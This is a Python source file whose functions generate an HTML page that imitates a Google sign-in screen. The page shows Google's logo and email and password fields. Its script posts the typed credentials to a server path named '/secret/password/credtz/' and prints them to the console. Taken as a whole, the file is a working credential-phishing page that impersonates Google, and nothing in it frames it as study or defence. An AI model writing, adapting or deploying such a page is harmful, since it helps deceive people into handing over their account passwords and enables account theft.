def input_fields():
    return """
    <div style="margin-top: 20px;">
        <input type="email" id="email" placeholder="Email" style="width: 100%; padding: 10px; margin-bottom: 20px;">
        <input type="password" id="password" placeholder="Password" style="width: 100%; padding: 10px;">
    </div>
    """

def submit_button():
    return """
    <div style="margin-top: 40px;">
        <button onclick="sendData()" style="padding: 10px 20px;">Submit</button>
    </div>
    <script>
        async function sendData() {
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            const response = await fetch('/secret/password/credtz/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email: email, password: password })
            });
            const result = await response.json();
            console.clear();
            console.log('Email: ' + result.email);
            console.log('Password: ' + result.password);
        }
    </script>
    """

def google_log():
    html_content = f"""
    <html>
        <head>
            <style>
                body {{
                    display: flex;
                    justify-content: center;
                    align-items: flex-start;
                    height: 100vh;
                    margin: 0;
                    font-family: Arial, sans-serif;
                    padding-top: 100px;
                }}
                img {{
                    max-width: 60%;
                    height: auto;
                    margin-left: 40px;
                }}
                h3 {{
                    text-align: center;
                }}
                input {{
                    display: block;
                    width: 100%;
                    padding: 10px;
                    margin-bottom: 20px;
                    box-sizing: border-box;
                }}
                button {{
                    display: block;
                    width: 100%;
                    padding: 10px;
                    margin-top: 40px;
                    box-sizing: border-box;
                }}
            </style>
        </head>
        <body>
            <div>
                <h3></h3>
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo">
                {input_fields()}
                {submit_button()}
            </div>
        </body>
    </html>
    """
    return html_content